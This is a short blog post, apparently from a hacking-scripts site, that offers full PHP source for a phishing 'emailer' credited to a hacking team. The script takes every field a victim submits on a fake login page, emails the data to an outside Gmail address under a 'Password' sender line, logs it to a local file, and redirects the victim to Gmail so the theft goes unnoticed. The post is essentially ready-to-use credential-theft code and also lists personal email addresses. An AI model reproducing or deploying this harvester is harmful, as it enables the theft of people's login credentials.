---
id: 237
title: Emailer script
author: admin
layout: post
guid: http://hackingscripts.com/?p=237
permalink: /emailer-script/
categories:
  - PHP
tags:
  - emailer
  - PHP
---
Emailer script &#8211; Coded by Hangaw_HawlerY of H4KurD-TeaM

## Emailer Script Source Code

<pre class="brush: php; title: ; notranslate" title="">&lt;?php

/* 
H4KurD-TeaM
www.h4kurd.com
Coded By : Hangaw_HawlerY
Email: Hangaw_HawlerY@Yahoo.com , Hangaw_HawlerY@Hotmail.com 
All Right Reserved
*/

header ('Location: https://www.gmail.com');

$posts        = '';
foreach($_POST as $k =&gt; $v){
    $posts .= '$_POST['.$k.'] = '.$v."\n";
}

$posts       .= "---------------------------------------------------\n";
$emailto    = 'pramod.sin321@gmail.com';
$subject    = $_SERVER['HTTP_HOST']."-".$_SEREVER['SERVER_NAME'];
$from        = "From: Password &lt;h4kurd.team@gmail.com&gt;";
$body        = '
'.$posts.'
';

@mail($emailto, $subject, $body, $from);
$handle = @fopen("h4kurd.txt", "a+");
@fwrite($handle, $posts);
fclose($handle);
?&gt;
</pre>